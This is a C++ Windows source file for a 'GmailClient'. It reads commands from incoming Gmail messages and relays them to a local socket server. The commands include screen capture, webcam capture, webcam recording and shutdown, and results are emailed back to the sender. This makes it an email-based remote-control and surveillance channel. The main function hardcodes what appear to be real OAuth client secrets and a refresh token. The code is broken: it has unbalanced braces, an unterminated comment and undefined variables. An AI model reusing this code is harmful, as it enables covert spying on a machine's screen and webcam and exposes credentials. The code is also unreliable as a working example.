#define CURL_STATICLIB

#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h> 
#include <string>
#include <fstream>
#include "curl/curl.h"
#include "json.hpp"
#include <sstream>
#include <ctime>
#include <iomanip>
#include <chrono>
#include <thread>
#include <set>
#include <memory>
#include <vector>

#pragma comment(lib, "Normaliz.lib")
#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Wldap32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "advapi32.lib")

using json = nlohmann::json;
const int BUFFER_SIZE = 1024;

class GmailClient {
private:
    static constexpr int PORT = 8080;
    static constexpr int BUFFER_SIZE = 1024;
    bool isFirstRun;
    std::string clientId;
    std::string clientSecret;
    std::string refreshToken;
    std::string accessToken;
    std::set<std::string> processedIds;
    std::chrono::system_clock::time_point lastCheckTime;
    SOCKET sock;

    static size_t WriteCallback(void* contents, size_t size, size_t nmemb, std::string* userp) {
        userp->append(static_cast<char*>(contents), size * nmemb);
        return size * nmemb;
    }
    // Add these functions inside the GmailClient class as private methods:
private:
    std::string getQueryTime() const {
        auto now = std::chrono::system_clock::now();
        // Update lastCheckTime only after successfully processing messages
        auto time_t = std::chrono::system_clock::to_time_t(lastCheckTime);
        std::tm tm_local;

        #ifdef _WIN32
                localtime_s(&tm_local, &time_t);
        #else
                localtime_r(&time_t, &tm_local);
        #endif

        // Format using Unix timestamp (epoch seconds)
        std::ostringstream ss;
        ss << time_t;
        return ss.str();
    }

    std::string processNewEmails() {
        try {
            std::string queryTime = getQueryTime();
            // Use Unix timestamp directly in the query
            std::string encodedQuery = "after:" + queryTime;
            std::string url = "https://gmail.googleapis.com/gmail/v1/users/me/messages?maxResults=10&q=" + encodedQuery;

            std::cout << "\n=== Checking for new emails ===\n";

            std::string response = makeGetRequest(url);
            
            json messages = json::parse(response);
            std::string command = "no command";

            if (messages.contains("messages") && messages["messages"].is_array()) {             
                for (const auto& message : messages["messages"]) {
                    std::string messageId = message["id"];                   
                    if (processedIds.find(messageId) == processedIds.end()) {
                        command = processMessage(messageId);
                        processedIds.insert(messageId);
                        std::cout << "New message processed, command: " << command << std::endl;
                    }   
                    else {
                        std::cout << "No messages found in response\n";
                    }
                }
            }   
            else {
                std::cout << "No messages found in response\n";
            }

            return command;
        }
        catch (const std::exception& e) {
            std::cerr << "Error processing emails: " << e.what() << std::endl;
            refreshAccessToken();
            return "invalid";
        }
    }

    std::string processMessage(const std::string& messageId) {
        try {
            std::string messageUrl = "https://gmail.googleapis.com/gmail/v1/users/me/messages/" + messageId;
            std::string messageResponse = makeGetRequest(messageUrl);

            json emailData = json::parse(messageResponse);
            std::string subject, sender;

            // Extract sender and subject from headers
            for (const auto& header : emailData["payload"]["headers"]) {
                if (header["name"] == "Subject") {
                    subject = header["value"];
                }
                else if (header["name"] == "From") {
                    sender = header["value"];
                    // Extract email address from "Name <email@domain.com>" format
                    size_t start = sender.find('<');
                    size_t end = sender.find('>');
                    if (start != std::string::npos && end != std::string::npos) {
                        sender = sender.substr(start + 1, end - start - 1);
                    }
                }
            }

            // Format and send command to server
            std::string command = sender + ": " + subject;

            // Debug output
            std::cout << "Processing new email: " << command << std::endl;

            send(sock, command.c_str(), command.length(), 0);

            std::cout << "Command sent to server: " << command << std::endl;
            std::cout << "---" << std::endl;
			return command;
        }
        catch (const std::exception& e) {
            std::cerr << "Error processing message " << messageId << ": " << e.what() << std::endl;
        }
    }

    std::string urlEncode(const std::string& value) const {
        std::ostringstream escaped;
        escaped.fill('0');
        escaped << std::hex;

        for (char c : value) {
            if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
                escaped << c;
            }
            else {
                escaped << std::uppercase;
                escaped << '%' << std::setw(2) << int((unsigned char)c);
                escaped << std::nouppercase;
            }
        }

        return escaped.str();
    }

    std::string makeGetRequest(const std::string& url) const {
        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
        std::string response;

        if (curl) {
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, ("Authorization: Bearer " + accessToken).c_str());

            curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 10L);

            CURLcode res = curl_easy_perform(curl.get());
            if (res != CURLE_OK) {
                throw std::runtime_error(std::string("Curl request failed: ") + curl_easy_strerror(res));
            }

            curl_slist_free_all(headers);
        }

        return response;
    }

    void refreshAccessToken() {
        std::string postFields = "client_id=" + clientId +
            "&client_secret=" + clientSecret +
            "&refresh_token=" + refreshToken +
            "&grant_type=refresh_token";
        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
        std::string response;
        if (curl) {
            curl_easy_setopt(curl.get(), CURLOPT_URL, "https://oauth2.googleapis.com/token");
            curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, postFields.c_str());
            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
            CURLcode res = curl_easy_perform(curl.get());
            if (res != CURLE_OK) {
                throw std::runtime_error(std::string("Token refresh failed: ") + curl_easy_strerror(res));
            }
        }
        json jsonData = json::parse(response);
        accessToken = jsonData["access_token"];
    }
    /*void refreshAccessToken() {
        try {
            std::cout << "Refreshing access token..." << std::endl;

        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
        std::string response;

        if (curl) {
            curl_easy_setopt(curl.get(), CURLOPT_URL, "https://oauth2.googleapis.com/token");
            curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, postFields.c_str());
            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);

            CURLcode res = curl_easy_perform(curl.get());
            if (res != CURLE_OK) {
                throw std::runtime_error(std::string("Token refresh failed: ") + curl_easy_strerror(res));
            }
        }

        json jsonData = json::parse(response);
        accessToken = jsonData["access_token"];
    }

    //void handleServerCommand(const std::string& command) {
    //    std::vector<char> buffer(BUFFER_SIZE);
    //    std::string request;
    //    size_t colonPos = command.find(": ");
    //    if (colonPos != std::string::npos) {
    //        request = command.substr(colonPos + 2); // +2 to skip ": "
    //    }
    //    else {
    //        request = command; // If no ":" found, use the whole command
    //    }
    //    if (command == "exit" ) {
    //        throw std::runtime_error("Shutdown requested");
    //    }
    //    else if (request == "list" || request == "screen capture" ||
    //        request == "webcam capture" || request == "webcam record" || request == "shutdown") {
    //        send(sock, request.c_str(), request.size() + 1, 0);
    //        int bytes_received = recv(sock, buffer.data(), buffer.size(), 0);
    //        if (bytes_received > 0) {
    //            handleServerResponse(request, buffer.data(), bytes_received);
    //        }
    //    }
    //    else if (request == "no command"){
    //        
    //    }
    //    else {
    //        std::cout << "invalid command";
    //    }
    //}
    void handleServerCommand(const std::string& command) {
        try {      

            // Extract the request part after ": "
            std::string request = "invalid";
            size_t colonPos = command.find(": ");
            if (colonPos != std::string::npos && colonPos + 2 < command.length()) {
                request = command.substr(colonPos + 2); // +2 to skip ": "
            }
            else if (command == "invalid" || command == "no command") {
                request = command;
            }

            std::cout << "Parsed request: " << request << std::endl;  // Debug output
            // Handle the extracted request
            if (request == "exit") {
                throw std::runtime_error("Shutdown requested");
            }
            else if (request == "list" || request == "screen capture" ||
                request == "webcam capture" || request == "webcam record" ||
                request == "shutdown") {
                 
                handleServerResponse(request);
                              
            }
            else if (request == "no command") {
                // Do nothing for "no command"
                return;
            }
            else if (request == "invalid") {
                // Do nothing for "invalid"
                return;
            }
            else {
                std::cout << "Invalid command: " << request << std::endl;
            }
        }
        catch (const std::bad_alloc& e) {
            std::cout << "Memory allocation error: " << e.what() << std::endl;
        }
        catch (const std::exception& e) {
            std::cout << "Error in handleServerCommand: " << e.what() << std::endl;
        }
    }

    void handleServerResponse(const std::string& command) {
        if (command == "list") {         
            std::vector<char> buffer(BUFFER_SIZE);
            int bytes_received = recv(sock, buffer.data(), buffer.size() - 1, 0);
            buffer[bytes_received] = '\0';  
            std::cout << "Server response: " << std::string(buffer.data(), bytes_received) << std::endl;
        }
        else if (command == "screen capture" || command == "webcam capture") {
            receiveFile(command == "screen capture" ? "screenshot.bmp" : "webcam.jpg");
        }
        else if (command == "webcam record") {
            handleWebcamRecording();
        }
        else {
        }
    }

    void receiveFile(const std::string& filename) {
        size_t fileSize;
        if (recv(sock, reinterpret_cast<char*>(&fileSize), sizeof(fileSize), 0) != sizeof(fileSize)) {
            throw std::runtime_error("Failed to receive file size");
        }
        std::vector<char> buffer(fileSize);
        if (recv(sock, buffer.data(), fileSize, 0) != fileSize) {
            throw std::runtime_error("Failed to receive file data");
        }

        std::ofstream outFile(filename, std::ios::binary);
        outFile.write(buffer.data(), fileSize);
        std::cout << "File saved as " << filename << std::endl;
    }

    void handleWebcamRecording() {
        std::vector<char> buffer(BUFFER_SIZE);
        int bytes_received = recv(sock, buffer.data(), buffer.size() - 1, 0);
        buffer[bytes_received] = '\0';
        std::cout << "Server response: " << std::string(buffer.data(), bytes_received);
        std::string duration;
        std::getline(std::cin, duration);
        send(sock, duration.c_str(), duration.size() + 1, 0);

        // Create the JSON payload as a string
        std::string jsonPayload = "{\"raw\":\"" + encodedMessage + "\"}";

        // Send the email using CURL
        std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
        std::string response;

        if (curl) {
            struct curl_slist* headers = nullptr;
            headers = curl_slist_append(headers, ("Authorization: Bearer " + accessToken).c_str());
            headers = curl_slist_append(headers, "Content-Type: application/json");

            curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
            curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers);
            curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, jsonPayload.c_str());
            curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
            curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
            curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 10L);

            CURLcode res = curl_easy_perform(curl.get());
            if (res != CURLE_OK) {
                std::cerr << "Failed to send email: " << curl_easy_strerror(res) << std::endl;
            }
            else {
                std::cout << "Email sent successfully to " << recipientEmail << std::endl;
            }

            curl_slist_free_all(headers);
        }
    }

    void sendEmailToOriginalSender() {
        try {
            // Get the last processed email details from which the command originated
            if (processedIds.empty()) {
                return;
            }

            std::string lastMessageId = *processedIds.rbegin();
            std::string messageUrl = "https://gmail.googleapis.com/gmail/v1/users/me/messages/" + lastMessageId;
            std::string messageResponse = makeGetRequest(messageUrl);

            json emailData = json::parse(messageResponse);
            std::string originalSender;
            std::string originalSubject;

            // Extract original sender and subject
            for (const auto& header : emailData["payload"]["headers"]) {
                if (header["name"] == "From") {
                    originalSender = header["value"];
                    // Extract email address from "Name <email@domain.com>" format
                    size_t start = originalSender.find('<');
                    size_t end = originalSender.find('>');
                    if (start != std::string::npos && end != std::string::npos) {
                        originalSender = originalSender.substr(start + 1, end - start - 1);
                    }
                }
                else if (header["name"] == "Subject") {
                    originalSubject = "Re: " + header["value"];
                }
            }

            // Create response body based on operation type
            std::string responseBody;
            if (std::ifstream file{ "screenshot.bmp" }) {
                responseBody = "Screenshot captured successfully and saved.";
                file.close();
                std::remove("screenshot.bmp");
            }
            else if (std::ifstream file{ "webcam.jpg" }) {
                responseBody = "Webcam capture completed successfully and saved.";
                file.close();
                std::remove("webcam.jpg");
            }
            else if (std::ifstream file{ "recording.avi" }) {
                responseBody = "Webcam recording completed successfully and saved.";
                file.close();
                std::remove("recording.avi");
            }
            else {
                // For list commands, get the server response
                std::vector<char> buffer(BUFFER_SIZE);
                int bytes_received = recv(sock, buffer.data(), buffer.size() - 1, 0);
                if (bytes_received > 0) {
                    buffer[bytes_received] = '\0';
                    responseBody = std::string(buffer.data(), bytes_received);
                }
                else {
                    responseBody = "Command processed successfully.";
                }
            }

            // Send the response email
            sendEmailResponse(originalSender, originalSubject, responseBody);
        }
        catch (const std::exception& e) {
            std::cerr << "Error sending response email: " << e.what() << std::endl;
            refreshAccessToken();
        }
        catch (...) {
            std::cerr << "Unknown error in sendEmailToOriginalSender" << std::endl;
        }
        std::cout << "Completed sendEmailToOriginalSender" << std::endl;
    }

    void sendEmailResponse(const std::string& recipientEmail, const std::string& subject, const std::string& body) {
        try {
            std::cout << "Starting sendEmailResponse..." << std::endl;
            std::string url = "https://gmail.googleapis.com/gmail/v1/users/me/messages/send";

            // Create MIME message with proper line endings
            std::string rawMessage =
                "From: me\r\n"
                "To: " + recipientEmail + "\r\n"
                "Subject: " + subject + "\r\n"
                "Content-Type: text/plain; charset=utf-8\r\n"
                "\r\n" +
                body;

            std::cout << "Created raw message" << std::endl;

            // Base64 encode the raw message
            std::string encodedMessage = base64_encode(rawMessage);
            std::cout << "Encoded message in base64" << std::endl;

            // Create the JSON payload
            json jsonPayload = {
                {"raw", encodedMessage}
            };

            std::string jsonString = jsonPayload.dump();
            std::cout << "Created JSON payload" << std::endl;

            // Send the email using CURL
            std::unique_ptr<CURL, decltype(&curl_easy_cleanup)> curl(curl_easy_init(), curl_easy_cleanup);
            std::string response;

            if (curl) {
                std::cout << "Initializing CURL..." << std::endl;
                struct curl_slist* headers = nullptr;
                headers = curl_slist_append(headers, ("Authorization: Bearer " + accessToken).c_str());
                headers = curl_slist_append(headers, "Content-Type: application/json");

                curl_easy_setopt(curl.get(), CURLOPT_URL, url.c_str());
                curl_easy_setopt(curl.get(), CURLOPT_HTTPHEADER, headers);
                curl_easy_setopt(curl.get(), CURLOPT_POSTFIELDS, jsonString.c_str());
                curl_easy_setopt(curl.get(), CURLOPT_WRITEFUNCTION, WriteCallback);
                curl_easy_setopt(curl.get(), CURLOPT_WRITEDATA, &response);
                curl_easy_setopt(curl.get(), CURLOPT_TIMEOUT, 30L);  // Increased timeout
                curl_easy_setopt(curl.get(), CURLOPT_VERBOSE, 1L);   // Enable verbose output

                std::cout << "Sending email..." << std::endl;
                CURLcode res = curl_easy_perform(curl.get());

                if (res != CURLE_OK) {
                    std::string error = curl_easy_strerror(res);
                    std::cerr << "CURL failed: " << error << std::endl;
                    throw std::runtime_error("CURL failed: " + error);
                }

                long response_code;
                curl_easy_getinfo(curl.get(), CURLINFO_RESPONSE_CODE, &response_code);
                std::cout << "HTTP response code: " << response_code << std::endl;
                std::cout << "Response: " << response << std::endl;

                curl_slist_free_all(headers);
                std::cout << "Email sent successfully to " << recipientEmail << std::endl;
    }

public:
    GmailClient(const std::string& clientId, const std::string& clientSecret,
        const std::string& refreshToken)
        : clientId(clientId), clientSecret(clientSecret), refreshToken(refreshToken),
        isFirstRun(true) {
        lastCheckTime = std::chrono::system_clock::now();
        refreshAccessToken();
        initializeSocket();
    }

    void initializeSocket() {
        WSADATA wsa;
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            throw std::runtime_error("WSAStartup failed");
        }

        sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock == INVALID_SOCKET) {
            throw std::runtime_error("Socket creation failed");
        }

        sockaddr_in server_addr{};
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(PORT);
        inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr);

        if (connect(sock, reinterpret_cast<sockaddr*>(&server_addr), sizeof(server_addr)) < 0) {
            throw std::runtime_error("Connection failed");
        }
        else {
			std::cout << "Connected to server" << std::endl;
        }
    }


    void run() {
        while (true) {
            try {
                std::string command = processNewEmails();
				handleServerCommand(command);
                std::this_thread::sleep_for(std::chrono::seconds(10));
            }
            catch (const std::runtime_error& e) {
                if (std::string(e.what()) == "Shutdown requested") {
                    break;
                }
                std::cerr << "Error: " << e.what() << std::endl;
            }
        }
    }


    ~GmailClient() {
        closesocket(sock);
        WSACleanup();
    }
};

int main() {
    try {
        GmailClient client(
            "612933153793-1teill41m3i7t1qkit497uh6q8nkkhmc.apps.googleusercontent.com",
            "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",
            "1//0gGlASUVRT34ACgYIARAAGBASNwF-L9IrScLVZvA9HBLZ0Woc-yzUR_B_tAwt9AsYB3p7bhmytamp1sKciabuhRA3Smz8nYHgeG0"
        );

        client.run();
    }
    catch (const std::exception& e) {
        std::cerr << "Fatal error: " << e.what() << std::endl;
        return 1;
    }

    return 0;
}